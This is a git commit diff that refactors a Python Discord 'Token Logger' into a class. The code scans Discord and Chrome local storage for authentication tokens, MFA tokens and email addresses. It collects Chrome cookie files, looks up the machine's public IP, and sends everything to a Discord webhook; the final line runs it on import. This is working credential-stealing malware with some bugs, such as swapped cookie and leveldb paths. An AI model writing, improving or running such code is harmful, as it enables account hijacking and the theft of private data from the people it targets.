a595c03c06b61684dd1e61aef11b13879a8068b6
LittleDyingDuck <51399074+LittleDyingDuck@users.noreply.github.com>
2021-07-01 21:02:39 +1000

    Update main.py

--- main.py
+++ main.py
@@ -1,89 +1,97 @@
+
 import os
-import aiohttp
 import re
 import discord
+import aiohttp
 import asyncio
 import requests
-from discord import Webhook, AsyncWebhookAdapter
 
 
-regular_regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
-mfa_regex = re.compile(r"mfa\.[\w-]{84}")
-webhook = ""
-local_cache = os.environ['APPDATA']
-localapp = os.environ['LOCALAPPDATA']
-main = f"{local_cache}/discord/Local Storage/leveldb"
-canary = f"{local_cache}/discordcanary/Local Storage/leveldb"
-chrome_cookies = f"{localapp}/Google/Chrome/User Data/Default/Cookies"
-chrome_beta_cookies = f"{localapp}/Google/Chrome Beta/User Data/Default/Cookies"
-main_tokens = []
-canary_tokens = []
+class Logger:
+    def __init__(self, webhook):
+        self.MFA_Regex = re.compile(r"mfa\.[\w-]{84}")
+        self.Regular_Regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
+        self.Email_Regex = re.compile(r"""(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])""")
+        self.APPDATA = os.environ['APPDATA']
+        self.LOCALAPPDATA = os.environ['LOCALAPPDATA']
+        self.Vanilla_Client = f"{self.APPDATA}/discord/Local Storage/leveldb"
+        self.Canary_Client = f"{self.APPDATA}/discordcanary/Local Storage/leveldb"
+        self.Chrome_User_Data = f"{self.LOCALAPPDATA}/Google/Chrome/User Data/Default/"
+        self.Chrome_Beta_User_Data = f"{self.LOCALAPPDATA}/Google/Chrome Beta/User Data/Default/"
+        self.Tokens = []
+        self.Emails = []
+        self.webhook = webhook
+        self.Cookies_Found = False
+        self.Cookies_File = None
+        self.Beta_Cookies_Found = False
+        self.Beta_Cookies_File = None
+        # def start():
 
-# main client
-if os.path.exists(main):
-    for f in os.listdir(main):
-        if f.endswith(".ldb"):
-            for x in open(f"{main}/{f}", errors='ignore').readlines():
-                found = mfa_regex.findall(x)
-                if found:
-                    main_tokens.append(found[0])
-                found_non_mfa = regular_regex.findall(x)
-                if found_non_mfa:
-                    main_tokens.append(found_non_mfa[0])
+    def start(self):
+        self.init_scan()
+        loop = asyncio.get_event_loop()
+        loop.run_until_complete(self.send())
+        loop.close()
 
-# canary client
-if os.path.exists(canary):
-    for f in os.listdir(canary):
-        if f.endswith(".ldb"):
-            for x in open(f"{canary}/{f}", errors='ignore').readlines():
-                found = mfa_regex.findall(x)
-                if found:
-                    canary_tokens.append(found[0])
-                found_non_mfa = regular_regex.findall(x)
-                if found_non_mfa:
-                    canary_tokens.append(found_non_mfa[0])
+    def scan_path_files_for_token(self, path):
+        if os.path.isdir(path):
+            for file in os.listdir(path):
+                try:
+                    for f in open(f"{path}/{file}", errors="ignore").readlines():
+                        token_mfa = self.MFA_Regex.findall(f)
+                        if token_mfa:
+                            self.Tokens.append(token_mfa[0])
+                        token_vanilla = self.Regular_Regex.findall(f)
+                        if token_vanilla:
+                            self.Tokens.append(token_mfa[0])
+                        email = self.Email_Regex.findall(f)
+                        if email:
+                            self.Emails.append(email[0])
 
+                except BaseException:
+                    pass
 
-if os.path.isfile(chrome_cookies):
-    global chrome_release
-    global cr_exists
-    cr_exists = True
-    chrome_release = discord.File(chrome_cookies)
-else:
-    cr_exists = False
+    def init_scan(self):
+        # Vanilla
+        self.scan_path_files_for_token(self.Vanilla_Client)
+        # Canary
+        self.scan_path_files_for_token(self.Canary_Client)
+        # Chrome
+        self.scan_path_files_for_token(self.Chrome_User_Data)
+        if os.path.isfile(self.Chrome_User_Data + "/Cookies"):
+            self.Cookies_Found = True
+            self.Cookies_File = discord.File(self.Chrome_User_Data + "/Local Storage/leveldb")
+        # Chrome Beta
+        self.scan_path_files_for_token(self.Chrome_Beta_User_Data)
+        if os.path.isfile(self.Chrome_Beta_User_Data + "/Local Storage/leveldb"):
+            self.Beta_Cookies_Found = True
+            self.Beta_Cookies_File = discord.File(self.Chrome_Beta_User_Data + "/Cookies")
 
-if os.path.isfile(chrome_beta_cookies):
-    global chrome_beta
-    global crb_exists
-    crb_exists = True
-    chrome_beta = discord.File(open(chrome_beta_cookies, "rb"))
-else:
-    crb_exists = False
+    async def send(self):
+        webhook = self.webhook
+        async with aiohttp.ClientSession() as session:
+            w = discord.Webhook.from_url(webhook, adapter=discord.AsyncWebhookAdapter(session))
+            e = discord.Embed(title="Token Logger", description="")
+            e.add_field(name="Discord Tokens", value="\n\n".join(self.Tokens), inline=False)
+            e.add_field(name="IP", value=requests.get("https://api.ipify.org").text)
+            if self.Beta_Cookies_Found:
+                wb = discord.Webhook.from_url(webhook, adapter=discord.AsyncWebhookAdapter(session))
+                eb = discord.Embed(title="Chrome Beta Cookies", description="")
+                await wb.send(embed=eb)
+                await wb.send(file=self.Beta_Cookies_File)
+            elif self.Cookies_Found:
+                wr = discord.Webhook.from_url(webhook, adapter=discord.AsyncWebhookAdapter(session))
+                er = discord.Embed(title="Chrome Cookies", description="")
+                await wr.send(embed=er)
+                await wr.send(file=self.Cookies_File)
+            elif self.Emails:
+                file = open("Found_Emails.txt", "w+")
+                file.write("\n".join(self.Emails))
+                #file.close()
+                wr = discord.Webhook.from_url(webhook, adapter=discord.AsyncWebhookAdapter(session))
+                er = discord.Embed(title="Found Emails", description="")
+                await wr.send(embed=er, file=discord.File(file))
 
-# print(canary_tokens)
-# print(main_tokens)
-async def send():
-    async with aiohttp.ClientSession() as session:
-        w = Webhook.from_url(webhook, adapter=AsyncWebhookAdapter(session))
-        e = discord.Embed(title="Token Logger", description="")
-        e.add_field(name="Canary Tokens", value="\n\n".join(canary_tokens), inline=False)
-        e.add_field(name="\nDefault Client Tokens", value="\n\n".join(main_tokens), inline=False)
-        e.add_field(name="IP", value=requests.get("https://api.ipify.org").text)
-        if crb_exists:
-            wb = Webhook.from_url(webhook, adapter=AsyncWebhookAdapter(session))
-            eb = discord.Embed(title="Chrome Beta Cookies", description="")
-            await wb.send(file=chrome_beta, embed=eb)
-        elif cr_exists:
-            wr = Webhook.from_url(webhook, adapter=AsyncWebhookAdapter(session))
-            er = discord.Embed(title="Chrome Cookies", description="")
-            await wr.send(file=chrome_release, embed=er)
-        await w.send(embed=e)
+            await w.send(embed=e)
 
-
-
-def main():
-    loop = asyncio.get_event_loop()
-    loop.run_until_complete(send())
-    loop.close()
-
-main()
+Logger("https://discord.com/api/webhooks/blahblahID/blahblah").start()
